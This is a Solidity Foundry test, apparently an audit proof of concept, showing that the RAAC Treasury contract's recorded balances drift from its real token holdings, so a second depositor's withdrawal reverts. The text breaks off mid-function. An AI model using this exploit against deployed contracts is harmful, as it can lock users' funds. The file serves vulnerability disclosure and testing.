import "@openzeppelin/contracts/token/ERC20/ERC20.sol";

import "src/core/tokens/RAACToken.sol";
import "src/core/collectors/Treasury.sol";

contract TreasuryDenialOfServiceTest is Test {
    Treasury internal treasury;
    RAACToken internal raac;

    address internal admin;
    address internal minter;
    address internal user;

    function setUp() public {
        // Role Creation
        admin = address(this);
        minter = makeAddr("minter");
        user = makeAddr("user");

        // Treasury Creation
        treasury = new Treasury(admin);

        // Create Mock RAAC Token
        raac = new RAACToken(admin, 0, 0);

        raac.setMinter(minter);

        // Mint 100e18 RAAC Token to minter for simulation
        vm.prank(minter);
        raac.mint(minter, 100e18);

        // Mint 100e18 RAAC Token to hacker for simulation
        vm.prank(minter);
        raac.mint(user, 100e18);
    }

    function testExploit() public {
        // User0 deposit 100e18 RAAC Token into the treasury
        vm.startPrank(user);
        raac.approve(address(treasury), 100e18);
        treasury.deposit(address(raac), 100e18);
        vm.stopPrank();

        // User1 deposit 100e18 RAAC Token into the treasury
        vm.startPrank(minter);
        raac.approve(address(treasury), 100e18);
        treasury.deposit(address(raac), 100e18);
        vm.stopPrank();

        // Token Amount record is not the same as the actual token balance
        assertNotEq(raac.balanceOf(address(treasury)), treasury.getBalance(address(treasury)));

        // Withdraw token for user succeeds
        treasury.withdraw(address(raac), 100e18, user);

        // Withdraw token for minter fails
        vm.expectRevert();
        treasury.withdraw(address(raac), 100e18, minter);
